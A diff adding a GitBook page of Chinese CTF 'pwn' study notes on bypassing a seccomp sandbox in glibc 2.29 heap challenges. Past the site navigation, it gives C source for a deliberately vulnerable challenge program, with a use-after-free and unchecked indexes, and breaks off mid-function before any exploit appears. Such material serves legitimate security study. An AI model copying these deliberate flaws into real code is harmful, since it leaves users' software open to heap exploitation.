@@ -1,0 +1,1608 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>glibc2.29下堆题绕过沙箱 · Gitbook电子书</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="TTY">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html" />
+    
+    
+    <link rel="prev" href="../glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../pwn基础/">
+            
+                <a href="../../pwn基础/">
+            
+                    
+                    pwn基础
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../pwn基础/gdb使用/gdb使用.html">
+            
+                <a href="../../pwn基础/gdb使用/gdb使用.html">
+            
+                    
+                    gdb使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                <a href="../../pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                    
+                    glibc更换_patchelf方法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                <a href="../../pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                    
+                    linux系统调用号查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../../pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                <a href="../../pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                    
+                    pwn题编译时的保护选项
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../fmt/fmt/fmt.html">
+            
+                <a href="../../fmt/fmt/fmt.html">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="../../fmt/fmtstr模块/fmtstr模块.html">
+            
+                <a href="../../fmt/fmtstr模块/fmtstr模块.html">
+            
+                    
+                    fmtstr模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="../../fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                <a href="../../fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                    
+                    格式化字符串中的占位符特殊用法
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../rop/">
+            
+                <a href="../../rop/">
+            
+                    
+                    rop
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../rop/ret2csu/ret2csu.html">
+            
+                <a href="../../rop/ret2csu/ret2csu.html">
+            
+                    
+                    ret2csu
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../../rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                <a href="../../rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                    
+                    通过mmap&mprotect来绕过nx
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../../rop/srop/srop.html">
+            
+                <a href="../../rop/srop/srop.html">
+            
+                    
+                    srop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../../rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                <a href="../../rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                    
+                    dl_runtime_resolve
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.5" data-path="../../rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                <a href="../../rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                    
+                    dl_runtime_resolve_64位
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.6" data-path="../../rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                <a href="../../rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                    
+                    Ret2dlresolvePayload使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../../heap_related/">
+            
+                <a href="../../heap_related/">
+            
+                    
+                    heap_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../heap_related/house_of_botcake/house_of_botcake.html">
+            
+                <a href="../../heap_related/house_of_botcake/house_of_botcake.html">
+            
+                    
+                    house_of_botcake
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../../heap_related/House_of_Einherjar/House_of_Einherjar.html">
+            
+                <a href="../../heap_related/House_of_Einherjar/House_of_Einherjar.html">
+            
+                    
+                    House_of_Einherjar
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../../heap_related/House_Of_Force/House_Of_Force.html">
+            
+                <a href="../../heap_related/House_Of_Force/House_Of_Force.html">
+            
+                    
+                    House_Of_Force
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../../heap_related/House_of_lore/House_of_lore.html">
+            
+                <a href="../../heap_related/House_of_lore/House_of_lore.html">
+            
+                    
+                    House_of_lore
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../../heap_related/House_of_Orange/House_of_Orange.html">
+            
+                <a href="../../heap_related/House_of_Orange/House_of_Orange.html">
+            
+                    
+                    House_of_Orange
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.6" data-path="../../heap_related/House_of_storm/House_of_storm.html">
+            
+                <a href="../../heap_related/House_of_storm/House_of_storm.html">
+            
+                    
+                    House_of_storm
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.7" data-path="../../heap_related/how2heap学习/how2heap解析.html">
+            
+                <a href="../../heap_related/how2heap学习/how2heap解析.html">
+            
+                    
+                    how2heap解析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.8" data-path="../../heap_related/large_bin_attack/large_bin_attack.html">
+            
+                <a href="../../heap_related/large_bin_attack/large_bin_attack.html">
+            
+                    
+                    large_bin_attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.9" data-path="../../heap_related/ptmalloc_check/ptmalloc_check.html">
+            
+                <a href="../../heap_related/ptmalloc_check/ptmalloc_check.html">
+            
+                    
+                    ptmalloc_check
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.10" data-path="../../heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                <a href="../../heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                    
+                    unlink攻击敏感指针
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.11" data-path="../../heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                <a href="../../heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                    
+                    unsorted_bin相关攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.12" data-path="../../heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                <a href="../../heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                    
+                    IO_2_1_stdout泄露内存
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../../FILE_related/">
+            
+                <a href="../../FILE_related/">
+            
+                    
+                    FILE_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../FILE_related/close_free/fog.html">
+            
+                <a href="../../FILE_related/close_free/fog.html">
+            
+                    
+                    fog
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                <a href="../../FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                    
+                    FILE攻击的一些进阶操作_待补充
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                <a href="../../FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                    
+                    FILE结构体概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../FILE_related/FSOP/FSOP.html">
+            
+                <a href="../../FILE_related/FSOP/FSOP.html">
+            
+                    
+                    FSOP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../FILE_related/vtable伪造/vtable伪造.html">
+            
+                <a href="../../FILE_related/vtable伪造/vtable伪造.html">
+            
+                    
+                    vtable伪造
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    沙箱
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                <a href="../glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.27下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.6.2" data-path="glibc2.29下堆题绕过沙箱.html">
+            
+                <a href="glibc2.29下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.29下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                <a href="../glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.31下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../seccomp&ptcl/seccomp&ptcl.html">
+            
+                <a href="../seccomp&ptcl/seccomp&ptcl.html">
+            
+                    
+                    seccomp&ptcl
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../../arm_pwn/">
+            
+                <a href="../../../arm_pwn/">
+            
+                    
+                    arm_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                <a href="../../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                    
+                    arm&aarch64汇编
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                <a href="../../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                    
+                    ARMpwn基础环境搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                <a href="../../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                    
+                    树莓派搭建ARM环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../../kernel_pwn/">
+            
+                <a href="../../../kernel_pwn/">
+            
+                    
+                    kernel_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../../../kernel_pwn/c文件操作/c文件操作.html">
+            
+                <a href="../../../kernel_pwn/c文件操作/c文件操作.html">
+            
+                    
+                    c文件操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
+            
+                <a href="../../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
+            
+                    
+                    kernel_pwn_rop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                <a href="../../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                    
+                    linux_kernel保护机制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
+            
+                <a href="../../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
+            
+                    
+                    linux_kernel基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../../../kernel_pwn/ropper简单使用/ropper简单使用.html">
+            
+                <a href="../../../kernel_pwn/ropper简单使用/ropper简单使用.html">
+            
+                    
+                    ropper简单使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../../awd/">
+            
+                <a href="../../../awd/">
+            
+                    
+                    awd
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
+            
+                <a href="../../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
+            
+                    
+                    awdpwn流量转发手动
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                <a href="../../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                    
+                    evilPatcher_pwn通防
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                <a href="../../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                    
+                    如何在awd中苟活_pwn
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../../IOT漏洞挖掘/">
+            
+                <a href="../../../IOT漏洞挖掘/">
+            
+                    
+                    IOT漏洞挖掘
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                    
+                    IoT-vulhub学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1.1" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                    
+                    Cisco-CVE-2020-3331
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.2" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                    
+                    HUAWEI-CVE-2017-17215
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.3" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                    
+                    Netgear-CVE-2019-20760
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.4" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                    
+                    Tenda-CVE-2018-16333
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.5" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                    
+                    Tenda-CVE-2018-5767
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.6" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                    
+                    Tenda-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.7" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                    
+                    TP-Link-CVE-2020-8423
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.8" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                    
+                    VIVOTEK-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../../密码学/">
+            
+                <a href="../../../密码学/">
+            
+                    
+                    密码学
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../../密码学/AES/AES.html">
+            
+                <a href="../../../密码学/AES/AES.html">
+            
+                    
+                    AES
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../../../密码学/RC4/RC4.html">
+            
+                <a href="../../../密码学/RC4/RC4.html">
+            
+                    
+                    RC4
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../../../web/">
+            
+                <a href="../../../web/">
+            
+                    
+                    web
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../../../web/sql注入/sql注入.html">
+            
+                <a href="../../../web/sql注入/sql注入.html">
+            
+                    
+                    sql注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../../../机器学习/">
+            
+                <a href="../../../机器学习/">
+            
+                    
+                    机器学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../../../机器学习/pytorch/pytorch.html">
+            
+                <a href="../../../机器学习/pytorch/pytorch.html">
+            
+                    
+                    pytorch
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../../../机器学习/数据处理/数据处理.html">
+            
+                <a href="../../../机器学习/数据处理/数据处理.html">
+            
+                    
+                    数据处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >glibc2.29下堆题绕过沙箱</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="glibc229&#x4E0B;&#x5806;&#x9898;&#x7ED5;&#x8FC7;&#x6C99;&#x7BB1;">glibc2.29&#x4E0B;&#x5806;&#x9898;&#x7ED5;&#x8FC7;&#x6C99;&#x7BB1;</h2>
+<p>&#x8FD8;&#x662F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x9898;&#x76EE;</p>
+<p>gcc -o test test.c</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span>
+<span class="hljs-keyword">int</span> Nodes_len[<span class="hljs-number">0x10</span>];
+<span class="hljs-keyword">char</span> *Nodes[<span class="hljs-number">0x10</span>];
+<span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_atoi</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>];
+    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">8</span>);    
+    <span class="hljs-keyword">return</span> atoi(buf);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sandbox</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">struct</span> sock_filter filter[] = {
+    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">4</span>),
+    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">0xc000003e</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>),
+    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>),
+    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),
+    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
+    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
+    };
+    <span class="hljs-keyword">struct</span> sock_fprog prog = {
+    .len = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>)(<span class="hljs-keyword">sizeof</span>(filter)/<span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>])),
+    .filter = filter,
+    };
+    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
+    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> len;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;len:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;len);
+    <span class="hljs-keyword">if</span>(len&lt;<span class="hljs-number">0</span>||len&gt;<span class="hljs-number">0xfff</span>) <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span>(count&gt;<span class="hljs-number">0x10</span>){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;too many&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    Nodes[count] = <span class="hljs-built_in">malloc</span>(len);
+    Nodes_len[count] = len;
+    count++;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done!&quot;</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">del</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> idx;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);
+    <span class="hljs-keyword">if</span>(idx&gt;count){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error!&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-built_in">free</span>(Nodes[idx]);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done!&quot;</span>);    
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> idx;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx:&quot;</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);
+    <span class="hljs-keyword">if</span>(idx&gt;count){
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error!&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    read(<span class="hljs-number">0</span>,Nodes[idx],Nodes_len[idx]);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done!&quot;</span>);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> idx;
